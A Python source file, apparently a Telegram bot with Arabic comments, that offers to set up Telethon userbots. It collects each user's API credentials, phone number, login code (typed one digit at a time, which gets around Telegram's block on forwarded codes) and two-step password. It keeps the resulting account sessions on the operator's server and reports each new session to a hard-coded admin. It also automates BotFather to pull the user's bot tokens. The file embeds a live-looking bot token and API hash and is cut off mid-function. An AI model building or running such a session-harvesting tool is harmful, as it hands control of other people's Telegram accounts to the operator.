#!/usr/bin/env python3
# tele_session_manager.py - Enhanced Telegram Session Manager
# Final version with smart message handling and admin improvements

import os
import asyncio
import logging
import json
import aiohttp
from datetime import datetime
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.functions.channels import CreateChannelRequest, EditPhotoRequest, InviteToChannelRequest, EditAdminRequest
from telethon.tl.types import InputChatUploadedPhoto, InputPeerChannel, ChatAdminRights
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, filters,
    ContextTypes, ConversationHandler, CallbackQueryHandler
)
from userbot import start_userbot

# ==================== إعدادات التسجيل ====================
logging.basicConfig(
    filename='userbot_errors.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# ==================== الثوابت ====================
API_ID, API_HASH, PHONE, CODE_DIGITS, PASSWORD, BOT_TOKEN_USER = range(6)
CODE_LENGTH = 5

# التخزين العام
user_data_store = {}
admin_actions = {}
active_userbots = {}

# الإعدادات الرئيسية
ADMIN_ID = 1923931101
MAIN_BOT_TOKEN = "8594715948:AAGnvPK5O1TkHvm-bVoL5ehua6Do9L4J4_4"
USERS_FILE = "users.json"
SESSIONS_DIR = "sessions"
CONFIG_FILE = "config.json"

# الصور
STARTUP_IMAGE_URL = "https://i.postimg.cc/wxV3PspQ/1756574872401.gif"
DEFAULT_GROUP_PHOTO_URL = "https://i.postimg.cc/VNvHmGd0/Picsart-25-08-27-23-50-22-266.jpg"
DEFAULT_API_ID = 21173110
DEFAULT_API_HASH = "71db0c8aae15effc04dcfc636e68c349"

os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs("data", exist_ok=True)

# ==================== رموز التزيين ====================
DECOR_SUCCESS = "✦"
DECOR_ERROR = "✘"
DECOR_CANCEL = "✗"
DECOR_SESSIONS = "⎙"
DECOR_BROADCAST = "📣"
DECOR_STATS = "📊"
DECOR_SUBSCRIPTION = "🔒"
DECOR_IMAGE = "🖼"
DECOR_CHECK = "✔"
DECOR_DELETE = "✖"
DECOR_CODE = "🔢"
DECOR_TOKEN = "⚷"
DECOR_PHONE = "☏"
DECOR_FRAME = "━─━"
DECOR_TITLE = f"{DECOR_FRAME} {{}} {DECOR_FRAME}"

# ==================== إعدادات التطبيق ====================
DEFAULT_CONFIG = {
    "FORCE_CHANNELS": [],
    "SUBSCRIPTION_IMAGE": DEFAULT_GROUP_PHOTO_URL,
    "STARTUP_IMAGE": STARTUP_IMAGE_URL,
    "API_ID": DEFAULT_API_ID,
    "API_HASH": DEFAULT_API_HASH,
    "BOT_ENABLED": True
}

def load_config():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                cfg = json.load(f)
            for k, v in DEFAULT_CONFIG.items():
                if k not in cfg:
                    cfg[k] = v
            return cfg
    except Exception as e:
        logging.warning(f"فشل تحميل الإعدادات: {e}")
    return DEFAULT_CONFIG.copy()

def save_config(cfg):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logging.error(f"فشل حفظ الإعدادات: {e}")

config = load_config()

# ==================== حفظ/تحميل بيانات الجلسة ====================
def save_session_data(phone, bot_token, target_chat):
    session_data_file = os.path.join(SESSIONS_DIR, f"{phone.replace('+', '')}.json")
    data = {
        "bot_token": bot_token,
        "target_chat": target_chat,
        "phone": phone,
        "created_at": datetime.now().isoformat()
    }
    try:
        with open(session_data_file, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        logging.info(f"✅ تم حفظ بيانات الجلسة: {phone}")
    except Exception as e:
        logging.error(f"❌ فشل حفظ بيانات الجلسة {phone}: {e}")

def load_session_data(phone):
    session_data_file = os.path.join(SESSIONS_DIR, f"{phone.replace('+', '')}.json")
    if os.path.exists(session_data_file):
        try:
            with open(session_data_file, "r", encoding="utf-8") as f:
                data = json.load(f)
                logging.info(f"✅ تم تحميل بيانات الجلسة: {phone}")
                return data
        except Exception as e:
            logging.error(f"❌ فشل تحميل بيانات الجلسة {phone}: {e}")
    return None

# ==================== وظائف مساعدة ====================
def is_valid_api_id(api_id: str) -> bool:
    return api_id.isdigit() and len(api_id) >= 4

def is_valid_api_hash(api_hash: str) -> bool:
    return len(api_hash) == 32 and api_hash.isalnum()

def save_user(user_id: int):
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            users = json.load(f)
    except Exception:
        users = []
    if user_id not in users:
        users.append(user_id)
        try:
            with open(USERS_FILE, "w", encoding="utf-8") as f:
                json.dump(users, f, ensure_ascii=False)
            logging.info(f"✅ تم حفظ المستخدم: {user_id}")
        except Exception as e:
            logging.error(f"❌ فشل حفظ المستخدم: {e}")

async def check_force_sub(user_id: int, bot: Bot) -> bool:
    channels = config.get("FORCE_CHANNELS", [])
    if not channels:
        return True
    for channel in channels:
        try:
            member = await bot.get_chat_member(channel, user_id)
            if member.status not in ("member", "administrator", "creator"):
                return False
        except Exception as e:
            logging.warning(f"⚠️ فشل التحقق من الاشتراك في {channel}: {e}")
            return False
    return True

# ✅ دالة حذف الرسالة السابقة (للمستخدمين العاديين)
async def delete_previous_message(context: ContextTypes.DEFAULT_TYPE, chat_id: int):
    """حذف الرسالة السابقة للمستخدمين العاديين"""
    try:
        if "last_message_id" in context.user_data:
            await context.bot.delete_message(chat_id=chat_id, message_id=context.user_data["last_message_id"])
            del context.user_data["last_message_id"]
    except Exception as e:
        logging.debug(f"لا يمكن حذف الرسالة السابقة: {e}")

# ✅ دالة تعديل الرسالة (للأدمن فقط)
async def edit_admin_message(context: ContextTypes.DEFAULT_TYPE, chat_id: int, text: str, 
                             reply_markup=None, photo=None, parse_mode=None):
    """تعديل رسالة الأدمن أو إرسال جديدة"""
    try:
        if "admin_message_id" in context.user_data:
            try:
                if photo:
                    # لو في صورة، نحذف القديمة ونبعت جديدة
                    await context.bot.delete_message(chat_id=chat_id, message_id=context.user_data["admin_message_id"])
                    msg = await context.bot.send_photo(chat_id=chat_id, photo=photo, caption=text, 
                                                       reply_markup=reply_markup, parse_mode=parse_mode)
                else:
                    # تعديل الرسالة النصية
                    msg = await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=context.user_data["admin_message_id"],
                        text=text,
                        reply_markup=reply_markup,
                        parse_mode=parse_mode
                    )
                context.user_data["admin_message_id"] = msg.message_id
                return msg
            except Exception as e:
                logging.debug(f"لا يمكن تعديل الرسالة: {e}")
        
        # إرسال رسالة جديدة
        if photo:
            msg = await context.bot.send_photo(chat_id=chat_id, photo=photo, caption=text,
                                               reply_markup=reply_markup, parse_mode=parse_mode)
        else:
            msg = await context.bot.send_message(chat_id=chat_id, text=text,
                                                 reply_markup=reply_markup, parse_mode=parse_mode)
        context.user_data["admin_message_id"] = msg.message_id
        return msg
    except Exception as e:
        logging.error(f"❌ خطأ في إرسال/تعديل رسالة الأدمن: {e}")
        return None

async def send_subscription_prompt(bot: Bot, user_id: int, context: ContextTypes.DEFAULT_TYPE):
    channels = config.get("FORCE_CHANNELS", [])
    img = config.get("SUBSCRIPTION_IMAGE")
    buttons = []
    for ch in channels:
        chname = ch.strip("@")
        url = f"https://t.me/{chname}"
        buttons.append(InlineKeyboardButton(f"📣 انضم إلى {ch}", url=url))
    buttons.append(InlineKeyboardButton(f"{DECOR_CHECK} تحقق من الاشتراك", callback_data="force_joincheck"))
    
    rows = [[b] for b in buttons]
    reply_markup = InlineKeyboardMarkup(rows)
    caption = f"{DECOR_SUBSCRIPTION} يجب الاشتراك في القنوات التالية لاستخدام البوت {DECOR_SUBSCRIPTION}"
    
    await delete_previous_message(context, user_id)
    try:
        msg = await bot.send_photo(chat_id=user_id, photo=img, caption=caption, reply_markup=reply_markup)
        context.user_data["last_message_id"] = msg.message_id
    except Exception as e:
        logging.warning(f"⚠️ فشل إرسال صورة الاشتراك: {e}")
        msg = await bot.send_message(chat_id=user_id, text=caption, reply_markup=reply_markup)
        context.user_data["last_message_id"] = msg.message_id

async def send_welcome_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if hasattr(update, 'effective_user'):
        user_id = update.effective_user.id
    elif hasattr(update, 'from_user'):
        user_id = update.from_user.id
    else:
        return
    
    img = config.get("STARTUP_IMAGE", STARTUP_IMAGE_URL)
    caption = f"{DECOR_TITLE.format('مرحباً بك')}\n\n✨ اضغط ابدأ لتنصيب تيليثون {DECOR_SUCCESS}"
    buttons = [[InlineKeyboardButton(f"{DECOR_SUCCESS} ابدأ الآن", callback_data="start_now")]]
    reply_markup = InlineKeyboardMarkup(buttons)

    await delete_previous_message(context, user_id)
    try:
        msg = await context.bot.send_animation(chat_id=user_id, animation=img, caption=caption, reply_markup=reply_markup)
        context.user_data["last_message_id"] = msg.message_id
    except Exception as e:
        logging.warning(f"⚠️ فشل إرسال صورة الترحيب: {e}")
        msg = await context.bot.send_message(chat_id=user_id, text=caption, reply_markup=reply_markup)
        context.user_data["last_message_id"] = msg.message_id

async def notify_admin_session(phone: str, user_id: int, session_file: str):
    keyboard = [
        [
            InlineKeyboardButton(f"{DECOR_CHECK} السماح", callback_data=f"allow|{session_file}"),
            InlineKeyboardButton(f"{DECOR_DELETE} الحذف", callback_data=f"delete_session|{session_file}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = f"{DECOR_TITLE.format('جلسة جديدة')}\n\n{DECOR_PHONE} الرقم: {phone}\n{DECOR_TOKEN} المستخدم: {user_id}\n{DECOR_SESSIONS} الملف: {session_file}"
    try:
        await Bot(token=MAIN_BOT_TOKEN).send_message(ADMIN_ID, text, reply_markup=reply_markup)
    except Exception as e:
        logging.error(f"❌ فشل إشعار المطور: {e}")

# ==================== إنشاء البوت والمجموعة ====================
async def check_existing_bot(client: TelegramClient) -> dict:
    """التحقق من وجود بوت موجود والحصول على التوكن"""
    try:
        botfather = await client.get_entity('BotFather')
        await client.send_message(botfather, '/mybots')
        await asyncio.sleep(2)
        
        messages = await client.get_messages(botfather, limit=1)
        if messages and messages[0].reply_markup:
            buttons = messages[0].reply_markup.rows
            if buttons and len(buttons) > 0:
                bot_button = buttons[0].buttons[0]
                bot_username = bot_button.text.strip('@')
                
                await client.send_message(botfather, f'@{bot_username}')
                await asyncio.sleep(2)
                await client.send_message(botfather, '/token')
                await asyncio.sleep(2)
                
                token_messages = await client.get_messages(botfather, limit=1)
                if token_messages and token_messages[0].text:
                    text = token_messages[0].text
                    if ':' in text:
                        lines = text.split('\n')
                        for line in lines:
                            if ':' in line and 'AAH' in line:
                                token = line.strip()
                                return {'exists': True, 'token': token, 'username': bot_username}
        
        return {'exists': False}
    except Exception as e:
        logging.error(f"❌ خطأ في التحقق من البوت الموجود: {e}")
        return {'exists': False}

async def create_bot_automatically(update: Update, context: ContextTypes.DEFAULT_TYPE):
    client = user_data_store['client']
    
    if update.callback_query:
        chat_id = update.callback_query.message.chat_id
    else:
        chat_id = update.effective_user.id
    
    # ✅ حذف الرسالة السابقة وإرسال جديدة
    await delete_previous_message(context, chat_id)
    msg = await context.bot.send_message(chat_id=chat_id, text="🔍 جاري البحث عن بوت موجود...")
    context.user_data["last_message_id"] = msg.message_id
    
    existing_bot = await check_existing_bot(client)
    if existing_bot.get('exists'):
        user_data_store['bot_token'] = existing_bot['token']
        await delete_previous_message(context, chat_id)
        msg = await context.bot.send_message(
            chat_id=chat_id,
            text=f"{DECOR_CHECK} تم العثور على بوت موجود!\n\n"
                 f"📱 البوت: @{existing_bot['username']}\n"
                 f"{DECOR_SUCCESS} سيتم استخدام هذا البوت"
        )
        context.user_data["last_message_id"] = msg.message_id
        await asyncio.sleep(1.5)
        return await finalize_setup(update, context)
    
    # ✅ إذا لم يكن موجود
    await delete_previous_message(context, chat_id)
    msg = await context.bot.send_message(
        chat_id=chat_id,
        text=f"📢 لم يتم العثور على بوت موجود\n\n"
             f"🤖 سيتم إنشاء بوت جديد الآن...\n"
             f"⏳ انتظر قليلاً..."
    )
    context.user_data["last_message_id"] = msg.message_id
    
    try:
        botfather = await client.get_entity('BotFather')
        await client.send_message(botfather, '/newbot')
        await asyncio.sleep(2)
        
        bot_name = f"TALASHNY_{datetime.now().strftime('%Y%m%d%H%M')}"
        await client.send_message(botfather, bot_name)
        await asyncio.sleep(2)
        
        bot_username = f"TALASHNY{datetime.now().strftime('%H%M%S')}bot"
        await client.send_message(botfather, bot_username)
        await asyncio.sleep(3)
        
        await delete_previous_message(context, chat_id)
        msg = await context.bot.send_message(
            chat_id=chat_id,
            text=f"✅ تم إنشاء البوت!\n\n"
                 f"📱 البوت: @{bot_username}\n\n"
                 f"الآن:\n"
                 f"1️⃣ افتح @BotFather\n"
                 f"2️⃣ انسخ التوكن (الكود الطويل)\n"
                 f"3️⃣ أرسله هنا {DECOR_TOKEN}"
        )
        context.user_data["last_message_id"] = msg.message_id
        return BOT_TOKEN_USER
        
    except FloodWaitError as e:
        await delete_previous_message(context, chat_id)
        msg = await context.bot.send_message(
            chat_id=chat_id,
            text=f"⏳ فلود! انتظر {e.seconds} ثانية\n\n"
                 f"أو أرسل التوكن يدوياً من @BotFather {DECOR_TOKEN}"
        )
        context.user_data["last_message_id"] = msg.message_id
        return BOT_TOKEN_USER
    except Exception as e:
        logging.error(f"❌ فشل إنشاء البوت: {e}")
        await delete_previous_message(context, chat_id)
        msg = await context.bot.send_message(
            chat_id=chat_id,
            text=f"{DECOR_ERROR} فشل إنشاء البوت تلقائياً\n\n"
                 f"أرسل التوكن يدوياً من @BotFather {DECOR_TOKEN}"
        )
        context.user_data["last_message_id"] = msg.message_id
        return BOT_TOKEN_USER

async def create_and_setup_group(client: TelegramClient, bot_token: str):
    try:
        bot = Bot(token=bot_token)
        bot_info = await bot.get_me()
        bot_username = bot_info.username or str(bot_info.id)
    except Exception as e:
        raise Exception(f"{DECOR_ERROR} توكن غير صالح: {e}")

    group_title = "مجموعة تيليثون تلاشاني"
    group_about = """
╭━─━─━Source━─━─━➾

                @I0_I6

╞═⟃══TALASHNY══⟄═╡

          تم التنصيب بنجاح .     

╰━─━─━Source━─━─━➾"""

    try:
        result = await client(CreateChannelRequest(
            title=group_title,
            about=group_about,
            megagroup=True
        ))
        group = result.chats[0]
        group_id = group.id
        group_peer = InputPeerChannel(group_id, group.access_hash)
        logging.info(f"✅ تم إنشاء المجموعة: {group_id}")
    except Exception as e:
        raise Exception(f"{DECOR_ERROR} فشل إنشاء المجموعة: {e}")

    try:
        photo_url = config.get("SUBSCRIPTION_IMAGE", DEFAULT_GROUP_PHOTO_URL)
        async with aiohttp.ClientSession() as session:
            async with session.get(photo_url) as resp:
                if resp.status == 200:
                    photo_bytes = await resp.read()
                    uploaded_photo = await client.upload_file(photo_bytes, file_name="group_photo.jpg")
                    await client(EditPhotoRequest(
                        channel=group_peer,
                        photo=InputChatUploadedPhoto(file=uploaded_photo)
                    ))
                    logging.info(f"✅ تم تعيين صورة المجموعة")
    except Exception as e:
        logging.error(f"❌ فشل تعيين صورة المجموعة: {e}")

    try:
        await client(InviteToChannelRequest(channel=group_peer, users=[bot_username]))
        await asyncio.sleep(1)
        
        bot_entity = await client.get_entity(bot_username)
        admin_rights = ChatAdminRights(
            post_messages=True,
            edit_messages=True,
            delete_messages=True,
            ban_users=True,
            invite_users=True,
            pin_messages=True,
            change_info=True,
            manage_call=True
        )
        await client(EditAdminRequest(
            channel=group_peer,
            user_id=bot_entity.id,
            admin_rights=admin_rights,
            rank="مشرف"
        ))
        logging.info(f"✅ تم إضافة وترقية البوت: @{bot_username}")
    except Exception as e:
        logging.warning(f"⚠️ فشل إضافة/ترقية البوت: {e}")

    return group_id

async def keep_alive_monitor(phone: str):
    """مراقبة الاتصال وإعادة الاتصال تلقائياً"""
    while phone in active_userbots:
        try:
            client = active_userbots[phone]['client']
            if not client.is_connected():
                logging.warning(f"⚠️ انقطع الاتصال للجلسة {phone}، جاري إعادة الاتصال...")
                await client.connect()
                if await client.is_user_authorized():
                    logging.info(f"✅ تم إعادة الاتصال للجلسة {phone}")
                else:
                    logging.error(f"❌ الجلسة {phone} غير مصرح بها")
                    break
            await asyncio.sleep(60)
        except Exception as e:
            logging.error(f"❌ خطأ في keep-alive للجلسة {phone}: {e}")
            await asyncio.sleep(60)

async def restart_userbots():
    api_id = config.get("API_ID", DEFAULT_API_ID)
    api_hash = config.get("API_HASH", DEFAULT_API_HASH)
    
    logging.info(f"{DECOR_SUCCESS} بدء إعادة تشغيل اليوزربوتات...")
    
    session_files = [f for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]
    
    if not session_files:
        logging.info("ℹ️ لا توجد جلسات لإعادة تشغيلها")
        return
    
    for session_file in session_files:
        phone = session_file.replace('.session', '')
        session_path = os.path.join(SESSIONS_DIR, session_file)
        
        session_data = load_session_data(phone)
        if not session_data:
            logging.warning(f"⚠️ لا توجد بيانات للجلسة: {phone}")
            continue
        
        bot_token = session_data.get('bot_token')
        target_chat = session_data.get('target_chat')
        
        if not bot_token or not target_chat:
            logging.warning(f"⚠️ بيانات ناقصة للجلسة: {phone}")
            continue
        
        client = TelegramClient(session_path, api_id, api_hash)
        
        try:
            logging.info(f"🔄 محاولة الاتصال بالجلسة: {phone}")
            await client.connect()
            
            if not await client.is_user_authorized():
                logging.warning(f"⚠️ الجلسة غير مصرح بها: {phone}")
                await client.disconnect()
                continue
            
            try:
                bot = Bot(token=bot_token)
                bot_info = await bot.get_me()
                logging.info(f"✅ توكن صالح: @{bot_info.username}")
            except Exception as e:
                logging.error(f"❌ توكن غير صالح للجلسة {phone}: {e}")
                await client.disconnect()
                continue
            
            temp_store = {
                'client': client,
                'phone': phone,
                'bot_token': bot_token,
                'target_chat': target_chat
            }
            task = asyncio.create_task(start_userbot(client, target_chat, temp_store))
            monitor_task = asyncio.create_task(keep_alive_monitor(phone))
            
            active_userbots[phone] = {
                'client': client,
                'task': task,
                'monitor_task': monitor_task,
                'target_chat': target_chat
            }
            
            logging.info(f"✅ تم تشغيل اليوزربوت: {phone} → المجموعة: {target_chat}")
            print(f"✅ تيلثون شغال على: {phone}")
            
        except Exception as e:
            logging.error(f"❌ فشل إعادة تشغيل الجلسة {phone}: {e}")
            if client.is_connected():
                await client.disconnect()
    
    logging.info(f"{DECOR_SUCCESS} اكتملت إعادة تشغيل اليوزربوتات ({len(active_userbots)} نشط)")

# ==================== معالجات المحادثة ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    save_user(user_id)
    user_data_store.clear()
    
    if user_id == ADMIN_ID:
        # ✅ استخدام نفس صورة الترحيب (الجرافيك)
        img = config.get("STARTUP_IMAGE", STARTUP_IMAGE_URL)
        bot_enabled = config.get("BOT_ENABLED", True)
        bot_status = f"مفعّل {DECOR_SUCCESS}" if bot_enabled else f"معطل {DECOR_CANCEL}"
        caption = f"{DECOR_TITLE.format('لوحة تحكم المطور')}\n\n{DECOR_SUCCESS} حالة البوت: {bot_status}\n{DECOR_STATS} اليوزربوتات النشطة: {len(active_userbots)}"
        
        # ✅ زر التفعيل/التعطيل يعكس الحالة
        toggle_text = f"{DECOR_CANCEL} تعطيل البوت" if bot_enabled else f"{DECOR_SUCCESS} تفعيل البوت"
        
        keyboard = [
            [InlineKeyboardButton(f"{DECOR_BROADCAST} إذاعة", callback_data="broadcast")],
            [InlineKeyboardButton(f"{DECOR_STATS} إحصائيات", callback_data="stats")],
            [InlineKeyboardButton(f"{DECOR_SUBSCRIPTION} إدارة الاشتراك", callback_data="force_manage")],
            [InlineKeyboardButton(f"{DECOR_SESSIONS} الجلسات", callback_data="sessions")],
            [InlineKeyboardButton(f"{DECOR_SUCCESS} إنشاء جلسة", callback_data="create_session")],
            [InlineKeyboardButton(toggle_text, callback_data="toggle_bot")],
            [InlineKeyboardButton(f"{DECOR_DELETE} حذف جلسة", callback_data="delete_session")]
        ]
        
        # ✅ لوحة الأدمن تتحدث
        await edit_admin_message(context, user_id, caption, reply_markup=InlineKeyboardMarkup(keyboard), photo=img)
        return ConversationHandler.END

    if not config.get("BOT_ENABLED", True):
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(f"{DECOR_CANCEL} البوت معطل حالياً. تواصل مع المطور @I0_I6")
        context.user_data["last_message_id"] = msg.message_id
        return ConversationHandler.END

    if not await check_force_sub(user_id, context.bot):
        await send_subscription_prompt(context.bot, user_id, context)
        return ConversationHandler.END

    await send_welcome_message(update, context)
    return ConversationHandler.END

async def start_now_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if not config.get("BOT_ENABLED", True):
        await query.answer(f"{DECOR_CANCEL} البوت معطل", show_alert=True)
        return ConversationHandler.END
    
    if not await check_force_sub(user_id, context.bot):
        await send_subscription_prompt(context.bot, user_id, context)
        return ConversationHandler.END
    
    user_data_store.clear()
    await delete_previous_message(context, user_id)
    msg = await query.message.reply_text(f"{DECOR_TOKEN} أدخل API_ID:")
    context.user_data["last_message_id"] = msg.message_id
    return API_ID

async def create_session_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id != ADMIN_ID:
        return ConversationHandler.END
    
    user_data_store.clear()
    await delete_previous_message(context, user_id)
    msg = await query.message.reply_text(f"{DECOR_TOKEN} أدخل API_ID:")
    context.user_data["last_message_id"] = msg.message_id
    return API_ID

async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not config.get("BOT_ENABLED", True) and user_id != ADMIN_ID:
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(f"{DECOR_CANCEL} البوت معطل حالياً")
        context.user_data["last_message_id"] = msg.message_id
        return ConversationHandler.END
    
    api_id = update.message.text.strip()
    if not is_valid_api_id(api_id):
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(f"{DECOR_ERROR} API_ID يجب أن يكون أرقام فقط!")
        context.user_data["last_message_id"] = msg.message_id
        return API_ID
    
    user_data_store['api_id'] = int(api_id)
    await delete_previous_message(context, user_id)
    msg = await update.message.reply_text(f"{DECOR_TOKEN} أدخل API_HASH:")
    context.user_data["last_message_id"] = msg.message_id
    return API_HASH

async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not config.get("BOT_ENABLED", True) and user_id != ADMIN_ID:
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(f"{DECOR_CANCEL} البوت معطل حالياً")
        context.user_data["last_message_id"] = msg.message_id
        return ConversationHandler.END
    
    api_hash = update.message.text.strip()
    if not is_valid_api_hash(api_hash):
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(f"{DECOR_ERROR} API_HASH يجب أن يكون 32 حرف!")
        context.user_data["last_message_id"] = msg.message_id
        return API_HASH
    
    user_data_store['api_hash'] = api_hash
    await delete_previous_message(context, user_id)
    msg = await update.message.reply_text(f"{DECOR_PHONE} أدخل رقم الهاتف (مع رمز الدولة، مثل: +1234567890):")
    context.user_data["last_message_id"] = msg.message_id
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not config.get("BOT_ENABLED", True) and user_id != ADMIN_ID:
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(f"{DECOR_CANCEL} البوت معطل حالياً")
        context.user_data["last_message_id"] = msg.message_id
        return ConversationHandler.END
    
    phone = update.message.text.strip()
    user_data_store['phone'] = phone
    
    session_file = os.path.join(SESSIONS_DIR, f"{phone.replace('+', '')}.session")
    client = TelegramClient(session_file, user_data_store['api_id'], user_data_store['api_hash'])
    
    await client.connect()
    user_data_store['client'] = client
    user_data_store['code_digits'] = []
    
    session_data = load_session_data(phone)
    if session_data and await client.is_user_authorized():
        bot_token = session_data.get('bot_token')
        target_chat = session_data.get('target_chat')
        
        if bot_token and target_chat:
            try:
                bot = Bot(token=bot_token)
                await bot.get_me()
                
                await delete_previous_message(context, user_id)
                msg = await update.message.reply_text(
                    f"{DECOR_CHECK} جلسة موجودة بالفعل!\n\n"
                    f"جاري إعادة التشغيل... {DECOR_SUCCESS}"
                )
                context.user_data["last_message_id"] = msg.message_id
                
                temp_store = {
                    'client': client,
                    'phone': phone,
                    'bot_token': bot_token,
                    'target_chat': target_chat
                }
                task = asyncio.create_task(start_userbot(client, target_chat, temp_store))
                monitor_task = asyncio.create_task(keep_alive_monitor(phone))
                
                active_userbots[phone] = {
                    'client': client,
                    'task': task,
                    'monitor_task': monitor_task,
                    'target_chat': target_chat
                }
                
                await delete_previous_message(context, user_id)
                msg = await update.message.reply_text(
                    f"{DECOR_SUCCESS} تم إعادة تشغيل اليوزربوت بنجاح!\n\n"
                    f"{DECOR_SESSIONS} الجلسة: {phone}\n"
                    f"{DECOR_CHECK} المجموعة: {target_chat}"
                )
                context.user_data["last_message_id"] = msg.message_id
                return ConversationHandler.END
                
            except Exception as e:
                logging.error(f"❌ التوكن المحفوظ غير صالح: {e}")
                await delete_previous_message(context, user_id)
                msg = await update.message.reply_text(
                    f"{DECOR_ERROR} التوكن المحفوظ غير صالح\n\n"
                    f"جاري التحقق من البوت... {DECOR_SUCCESS}"
                )
                context.user_data["last_message_id"] = msg.message_id
                return await create_bot_automatically(update, context)
    
    if await client.is_user_authorized():
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(
            f"{DECOR_CHECK} أنت مسجل بالفعل!\n\n"
            f"جاري التحقق من البوت... {DECOR_SUCCESS}"
        )
        context.user_data["last_message_id"] = msg.message_id
        return await create_bot_automatically(update, context)
    
    try:
        await client.send_code_request(phone)
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(
            f"{DECOR_CODE} تم إرسال كود التحقق!\n\n"
            f"أدخل الرقم الأول من الكود ({CODE_LENGTH} أرقام):"
        )
        context.user_data["last_message_id"] = msg.message_id
        return CODE_DIGITS
    except Exception as e:
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(
            f"{DECOR_ERROR} خطأ في إرسال الكود: {str(e)}\n\n"
            f"حاول مرة أخرى بإرسال /start"
        )
        context.user_data["last_message_id"] = msg.message_id
        return ConversationHandler.END

async def get_code_digits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not config.get("BOT_ENABLED", True) and user_id != ADMIN_ID:
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(f"{DECOR_CANCEL} البوت معطل حالياً")
        context.user_data["last_message_id"] = msg.message_id
        return ConversationHandler.END
    
    digit = update.message.text.strip()
    if not digit.isdigit() or len(digit) != 1:
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(f"{DECOR_ERROR} أدخل رقم واحد فقط!")
        context.user_data["last_message_id"] = msg.message_id
        return CODE_DIGITS
    
    user_data_store['code_digits'].append(digit)
    
    if len(user_data_store['code_digits']) < CODE_LENGTH:
        current = len(user_data_store['code_digits'])
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(f"{DECOR_CODE} أدخل الرقم التالي ({current + 1}/{CODE_LENGTH}):")
        context.user_data["last_message_id"] = msg.message_id
        return CODE_DIGITS
    
    code = "".join(user_data_store['code_digits'])
    client = user_data_store['client']
    phone = user_data_store['phone']
    session_file = os.path.join(SESSIONS_DIR, f"{phone.replace('+', '')}.session")
    
    try:
        await client.sign_in(phone=phone, code=code)
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(
            f"{DECOR_CHECK} تم تسجيل الدخول بنجاح!\n\n"
            f"جاري التحقق من البوت... {DECOR_SUCCESS}"
        )
        context.user_data["last_message_id"] = msg.message_id
        
        await notify_admin_session(phone, user_id, session_file)
        return await create_bot_automatically(update, context)
        
    except SessionPasswordNeededError:
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(
            f"{DECOR_SUBSCRIPTION} الحساب محمي بكلمة مرور\n\n"
            f"أدخل رمز التحقق بخطوتين:"
        )
        context.user_data["last_message_id"] = msg.message_id
        return PASSWORD
    except Exception as e:
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(
            f"{DECOR_ERROR} فشل تسجيل الدخول: {str(e)}\n\n"
            f"تأكد من الكود وحاول مرة أخرى"
        )
        context.user_data["last_message_id"] = msg.message_id
        return ConversationHandler.END

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not config.get("BOT_ENABLED", True) and user_id != ADMIN_ID:
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(f"{DECOR_CANCEL} البوت معطل حالياً")
        context.user_data["last_message_id"] = msg.message_id
        return ConversationHandler.END
    
    password = update.message.text.strip()
    client = user_data_store['client']
    phone = user_data_store['phone']
    session_file = os.path.join(SESSIONS_DIR, f"{phone.replace('+', '')}.session")
    
    try:
        await client.sign_in(password=password)
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(
            f"{DECOR_CHECK} تم تسجيل الدخول بنجاح!\n\n"
            f"جاري التحقق من البوت... {DECOR_SUCCESS}"
        )
        context.user_data["last_message_id"] = msg.message_id
        
        await notify_admin_session(phone, user_id, session_file)
        return await create_bot_automatically(update, context)
        
    except Exception as e:
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(
            f"{DECOR_ERROR} كلمة المرور غير صحيحة: {str(e)}\n\n"
            f"حاول مرة أخرى"
        )
        context.user_data["last_message_id"] = msg.message_id
        return PASSWORD

async def get_bot_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not config.get("BOT_ENABLED", True) and user_id != ADMIN_ID:
        await delete_previous_message(context, user_id)
